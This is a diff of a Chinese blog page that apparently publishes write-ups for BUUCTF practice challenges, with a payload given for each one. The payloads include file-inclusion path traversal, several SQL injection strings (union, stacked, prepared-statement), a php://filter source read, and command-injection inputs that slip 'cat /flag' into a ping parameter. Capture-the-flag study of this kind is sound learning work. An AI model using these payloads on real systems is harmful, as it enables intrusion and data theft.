@@ -6,16 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 文件包含漏洞 | smallwolf</title>
+  <title>BUUCTF的WP | smallwolf</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="个人技术博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="smallwolf">
-<meta property="og:url" content="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+  <meta name="description" content="1~5关1.[极客大挑战 2019]Havefun知识点 代码审计  做题过程首先进入页面发现没有啥利用点，于是通过F12审查网页源码在最后的注释地方发现了给咱们的提示，需要传入一个cat的参数，如果值与dog相等，那么就echo出flag。 payloadurl?cat&#x3D;dog 2.[HCTF 2018]WarmUp知识点 代码审计 文件包含漏洞  做题过程首先进入页面f12审查源码发现还有一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF的WP">
+<meta property="og:url" content="http://example.com/2021/02/08/BUUCTF%E7%9A%84WP/index.html">
 <meta property="og:site_name" content="smallwolf">
-<meta property="og:description" content="个人技术博客">
+<meta property="og:description" content="1~5关1.[极客大挑战 2019]Havefun知识点 代码审计  做题过程首先进入页面发现没有啥利用点，于是通过F12审查网页源码在最后的注释地方发现了给咱们的提示，需要传入一个cat的参数，如果值与dog相等，那么就echo出flag。 payloadurl?cat&#x3D;dog 2.[HCTF 2018]WarmUp知识点 代码审计 文件包含漏洞  做题过程首先进入页面f12审查源码发现还有一个">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-07T17:56:08.000Z">
+<meta property="article:modified_time" content="2021-03-02T09:58:59.509Z">
 <meta property="article:author" content="Tang zhen">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="smallwolf" type="application/atom+xml">
@@ -148,60 +151,319 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-BUUCTF的WP" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2021-01-09T14:05:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-09</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">文件包含漏洞和伪协议学习总结</a>
+    <h1 class="article-title" itemprop="name">
+      BUUCTF的WP
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/02/08/BUUCTF%E7%9A%84WP/" class="archive-article-date">
+  	<time datetime="2021-02-07T17:56:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-08</time>
+</a>
+        
+      </header>
+    
+
+<!-- 目录内容 -->
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+	<div id="toc-article" class="toc-article">
+	    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+		<strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">1~5关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">1.1.</span> <span class="toc-text">1.[极客大挑战 2019]Havefun</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.1.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-HCTF-2018-WarmUp"><span class="toc-number">1.2.</span> <span class="toc-text">2.[HCTF 2018]WarmUp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.3.</span> <span class="toc-text">3.[极客大挑战 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">4.[强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload"><span class="toc-number">1.4.3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-number">1.4.4.</span> <span class="toc-text">收获</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-SUCTF-2019-EasySQL"><span class="toc-number">1.5.</span> <span class="toc-text">5.[SUCTF 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7-1"><span class="toc-number">1.5.4.</span> <span class="toc-text">收获</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-10%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">6~10关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">2.1.</span> <span class="toc-text">6.[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="toc-number">2.1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-5"><span class="toc-number">2.1.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-4"><span class="toc-number">2.1.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">2.2.</span> <span class="toc-text">7.[极客大挑战 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-6"><span class="toc-number">2.2.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-6"><span class="toc-number">2.2.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-5"><span class="toc-number">2.2.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">2.3.</span> <span class="toc-text">8.[极客大挑战 2019]LoveSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-7"><span class="toc-number">2.3.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-7"><span class="toc-number">2.3.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-6"><span class="toc-number">2.3.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">2.4.</span> <span class="toc-text">9.[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-8"><span class="toc-number">2.4.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-8"><span class="toc-number">2.4.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-7"><span class="toc-number">2.4.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">2.5.</span> <span class="toc-text">10.[ACTF2020 新生赛]Exec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-9"><span class="toc-number">2.5.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-9"><span class="toc-number">2.5.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-8"><span class="toc-number">2.5.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-15%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">11-15关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">3.1.</span> <span class="toc-text">11.[极客大挑战 2019]Knife</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-10"><span class="toc-number">3.1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-10"><span class="toc-number">3.1.2.</span> <span class="toc-text">做题过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">3.2.</span> <span class="toc-text">12.[护网杯 2018]easy_tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-11"><span class="toc-number">3.2.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-11"><span class="toc-number">3.2.2.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-9"><span class="toc-number">3.2.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol>
+         </div>
+   <script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+		};
+   </script>
+      
+<!-- 目录内容结束 -->
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-5关"><a href="#1-5关" class="headerlink" title="1~5关"></a>1~5关</h2><h3 id="1-极客大挑战-2019-Havefun"><a href="#1-极客大挑战-2019-Havefun" class="headerlink" title="1.[极客大挑战 2019]Havefun"></a>1.[极客大挑战 2019]Havefun</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>代码审计</li>
+</ol>
+<h4 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h4><p>首先进入页面发现没有啥利用点，于是通过F12审查网页源码在最后的注释地方发现了给咱们的提示，需要传入一个cat的参数，如果值与dog相等，那么就echo出flag。</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>url?cat=dog</p>
+<h3 id="2-HCTF-2018-WarmUp"><a href="#2-HCTF-2018-WarmUp" class="headerlink" title="2.[HCTF 2018]WarmUp"></a>2.[HCTF 2018]WarmUp</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>代码审计</li>
+<li>文件包含漏洞</li>
+</ol>
+<h4 id="做题过程-1"><a href="#做题过程-1" class="headerlink" title="做题过程"></a>做题过程</h4><p>首先进入页面f12审查源码发现还有一个source.php，进入后看到了一大串的代码，接着进入白名单的hint.php查看，得知flag在fffflllllaaaagggg中，从最后一串代码可知我们考虑使用文件包含，获取出这里面的flag。接着考虑如何绕过checkfile。checkfile共有四次检测，一次检测是否page传入的是字符串，还有三次都是白名单检测。其中有mb_substr过滤?之后的东西，以及一次urldecode。这边我们考虑对?进行二次编码来绕过第一个substr过滤。然后上传即可。</p>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p>
+<h3 id="3-极客大挑战-2019-EasySQL"><a href="#3-极客大挑战-2019-EasySQL" class="headerlink" title="3.[极客大挑战 2019]EasySQL"></a>3.[极客大挑战 2019]EasySQL</h3><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>sql注入漏洞</li>
+</ol>
+<h4 id="做题过程-2"><a href="#做题过程-2" class="headerlink" title="做题过程"></a>做题过程</h4><p>首先进入页面常规尝试一下‘ 发现页面有报错，然后我们进行拼接语句。先使用order by判断有几个字段，在三的时候给出回显，接着拼接语句，显示到数据库的时候就给了咱们flag。</p>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p>url?username=1&amp;password=1’ union select 1,1,(select database()) %23</p>
+<p>或者利用万能密码url?username=1&amp;password=1’ #</p>
+<h3 id="4-强网杯-2019-随便注"><a href="#4-强网杯-2019-随便注" class="headerlink" title="4.[强网杯 2019]随便注"></a>4.[强网杯 2019]随便注</h3><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>sql注入漏洞</li>
+</ol>
+<h4 id="做题过程-3"><a href="#做题过程-3" class="headerlink" title="做题过程"></a>做题过程</h4><p>进入页面进行常规尝试发现是’字符型注入，接着利用order by判断可利用的字段数为2，然后尝试联合注入发现了非常严格的过滤。于是我们采用报错注入，然鹅select被限制了也查不出个啥玩意。这边看了别的wp发现原来是需要使用堆叠注入。</p>
+<p>通过堆叠注入语句得知了有两个表分别是words和一串数字，但是由于select等语句被限制，所以我们难以爆出数据。这是从默认回显的数据考虑，我们可以将一串数字的表中flag字段改名成默认回显的words表中的id。这样页面回显的就是flag了</p>
+<p>或者使用预编译的手段，拼接一个select语句并执行（注意，set和prepare采用了strstr函数过滤，考虑利用大小写绕过）</p>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ol>
+<li><pre><code class="mysql">-1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);Prepare stmt from @sql;EXECUTE stmt;#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;mysql</span><br><span class="line">   1&#39;; alter table &#96;words&#96; rename to &#96;words1&#96;;alter table &#96;1919810931114514&#96; rename to &#96;words&#96;;alter table &#96;words&#96; change flag id;#</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+<h4 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h4><ol>
+<li><p>以后遇到特别严格的sql注入需要考虑一下堆叠注入（尤其是看到multi_query()函数）</p>
+</li>
+<li><p>一直没有注意sql的反引号，导致有个查询卡了很久，mysql中用一对反引号来标注sql语句中的标识，如数据库名、表名、字段名等</p>
+</li>
+<li><p>对于页面本身默认回显的，且过滤十分严格的可以考虑尝试利用MySQL的alter和rename语句</p>
+</li>
+<li><p>对于过滤严格的sql注入，可以尝试使用预编译的手段</p>
+<p>预编译的相关语法</p>
+<blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set用于设置变量名和值</span><br><span class="line">prepare用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+</ol>
+<h3 id="5-SUCTF-2019-EasySQL"><a href="#5-SUCTF-2019-EasySQL" class="headerlink" title="5.[SUCTF 2019]EasySQL"></a>5.[SUCTF 2019]EasySQL</h3><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>sql注入漏洞</li>
+</ol>
+<h4 id="做题过程-4"><a href="#做题过程-4" class="headerlink" title="做题过程"></a>做题过程</h4><p>首先进行常规尝试，发现没有页面没有错误回显，所以报错注入泡汤，联合注入的语句被过滤也泡汤，布尔盲注的基础语句也无法得到错误回显，依旧泡汤。最终尝试堆叠注入，显示出了databases和tables，但是无法进行下一步操作了</p>
+<p>查看他人的wp得知需要对后端语句进行猜测</p>
+<ol>
+<li>输入非零数字得到的回显1和输入其余字符得不到回显猜测内部的查询语句可能存在有||</li>
+<li>进一步猜测post进去的数据||flag from Flag，这里的||起到的是or的作用</li>
+</ol>
+<p>设置mysql中sql_mode中的参数为pipes_as_concat，可以将||的作用改为拼接字符串</p>
+<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p>1;set sql_mode=pipes_as_concat;select 1</p>
+<h4 id="收获-1"><a href="#收获-1" class="headerlink" title="收获"></a>收获</h4><ol>
+<li>select任何一个常数都会在表中新建一列，然后查询出那一列的内容</li>
+<li>sql_mode：它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符</li>
+<li>对于输入非零数字有回显而其余字符没有回显要学会猜测后端的代码</li>
+</ol>
+<h2 id="6-10关"><a href="#6-10关" class="headerlink" title="6~10关"></a>6~10关</h2><h3 id="6-ACTF2020-新生赛-Include"><a href="#6-ACTF2020-新生赛-Include" class="headerlink" title="6.[ACTF2020 新生赛]Include"></a>6.[ACTF2020 新生赛]Include</h3><h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>文件包含漏洞</li>
+<li>伪协议</li>
+</ol>
+<h4 id="做题过程-5"><a href="#做题过程-5" class="headerlink" title="做题过程"></a>做题过程</h4><p>首先题目名为include，说明需要用到文件包含漏洞的知识，点开tips发现url存在文件包含，联系题目猜测是利用伪协议读取网页源码，首先考虑的是php://input”伪协议 + POST发送PHP代码但是发现被过滤，其次采用php://filter伪协议成功包含</p>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p>file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h3 id="7-极客大挑战-2019-Secret-File"><a href="#7-极客大挑战-2019-Secret-File" class="headerlink" title="7.[极客大挑战 2019]Secret File"></a>7.[极客大挑战 2019]Secret File</h3><h4 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>文件包含漏洞</li>
+<li>伪协议</li>
+<li>代码审计</li>
+</ol>
+<h4 id="做题过程-6"><a href="#做题过程-6" class="headerlink" title="做题过程"></a>做题过程</h4><p>进入页面根据题目名称查看一下源码，发现让我们到Archive_room.php去，进入后有一个红色的按钮，点进去跳到 end.php啥玩意都没有，hint是让我们回头看一下，仔细看一下源码发现有个action.php被隐藏了，进入后依旧跳到end.php，猜测是action.php的访问时间很短，结束了就自动跳到end.php。这边利用burp抓包发现有个secret.php被隐藏，进入后直接给了咱们源码。看到include函数得知是利用文件包含漏洞，采用php://filter伪协议然后解码一下获得flag</p>
+<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><p><a target="_blank" rel="noopener" href="http://0877ba48-66b5-4981-9251-dd77fc0cf501.node3.buuoj.cn/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php">http://0877ba48-66b5-4981-9251-dd77fc0cf501.node3.buuoj.cn/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p>
+<h3 id="8-极客大挑战-2019-LoveSQL"><a href="#8-极客大挑战-2019-LoveSQL" class="headerlink" title="8.[极客大挑战 2019]LoveSQL"></a>8.[极客大挑战 2019]LoveSQL</h3><h4 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>sql注入漏洞</li>
+</ol>
+<h4 id="做题过程-7"><a href="#做题过程-7" class="headerlink" title="做题过程"></a>做题过程</h4><p>进入页面首先尝试发现是单引号报错，有报错回显但是没有具体报错信息，所以不可以使用报错注入，尝试用联合查询，一步步得到flag</p>
+<p>Your password is  ‘1<del>cl4y</del>wo_tai_nan_le,2<del>glzjin</del>glzjin_wants_a_girlfriend,3<del>Z4cHAr7zCr</del>biao_ge_dddd_hm,4<del>0xC4m3l</del>linux_chuang_shi_ren,5<del>Ayrain</del>a_rua_rain,6<del>Akko</del>yan_shi_fu_de_mao_bo_he,7<del>fouc5</del>cl4y,8<del>fouc5</del>di_2_kuai_fu_ji,9<del>fouc5</del>di_3_kuai_fu_ji,10<del>fouc5</del>di_4_kuai_fu_ji,11<del>fouc5</del>di_5_kuai_fu_ji,12<del>fouc5</del>di_6_kuai_fu_ji,13<del>fouc5</del>di_7_kuai_fu_ji,14<del>fouc5</del>di_8_kuai_fu_ji,15<del>leixiao</del>Syc_san_da_hacker,16<del>flag</del>flag{2a95844c-8c34-4ace-84fd-b4db262e27fb}’</p>
+<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><ol>
+<li>爆数据库名：<a target="_blank" rel="noopener" href="http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;">http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;</a> union select 1,2,database()%23&amp;password=1</li>
+<li>爆表名：<a target="_blank" rel="noopener" href="http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;">http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’geek’%23&amp;password=1</li>
+<li>爆列名：<a target="_blank" rel="noopener" href="http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;">http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’l0ve1ysq1’%23&amp;password=1</li>
+<li>爆字段：<a target="_blank" rel="noopener" href="http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;">http://16acff21-709d-4913-b726-231dd188b6cd.node3.buuoj.cn/check.php?username=1&#39;</a> union select 1,2,group_concat(id,0x7e,username,0x7e,password) from geek.l0ve1ysq1%23&amp;password=1</li>
+</ol>
+<h3 id="9-GXYCTF2019-Ping-Ping-Ping"><a href="#9-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="9.[GXYCTF2019]Ping Ping Ping"></a>9.[GXYCTF2019]Ping Ping Ping</h3><h4 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>命令执行</li>
+</ol>
+<h4 id="做题过程-8"><a href="#做题过程-8" class="headerlink" title="做题过程"></a>做题过程</h4><p>进入页面后结合题目给出的ping提示，尝试输入?ip=127.0.0.1果然得到回显，接下来拼接ls，成功执行，后面在cat flag.php时遇到了一些过滤检测，尝试使用变量拼接成功得到flag</p>
+<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;b=ag;a=fl;cat<span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$a</span><span class="variable">$b</span>.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-ACTF2020-新生赛-Exec"><a href="#10-ACTF2020-新生赛-Exec" class="headerlink" title="10.[ACTF2020 新生赛]Exec"></a>10.[ACTF2020 新生赛]Exec</h3><h4 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>命令执行语句</li>
+</ol>
+<h4 id="做题过程-9"><a href="#做题过程-9" class="headerlink" title="做题过程"></a>做题过程</h4><p>此题是上一题的简易版，参考上一题即可</p>
+<h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat /flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-15关"><a href="#11-15关" class="headerlink" title="11-15关"></a>11-15关</h2><h3 id="11-极客大挑战-2019-Knife"><a href="#11-极客大挑战-2019-Knife" class="headerlink" title="11.[极客大挑战 2019]Knife"></a>11.[极客大挑战 2019]Knife</h3><h4 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>一句话木马</li>
+</ol>
+<h4 id="做题过程-10"><a href="#做题过程-10" class="headerlink" title="做题过程"></a>做题过程</h4><p>进入题目环境，直接有一行代码为eval（xxxxx），考虑连接蚁剑。果然在根目录存在一个flag文件</p>
+<h3 id="12-护网杯-2018-easy-tornado"><a href="#12-护网杯-2018-easy-tornado" class="headerlink" title="12.[护网杯 2018]easy_tornado"></a>12.[护网杯 2018]easy_tornado</h3><h4 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li>模板注入</li>
+</ol>
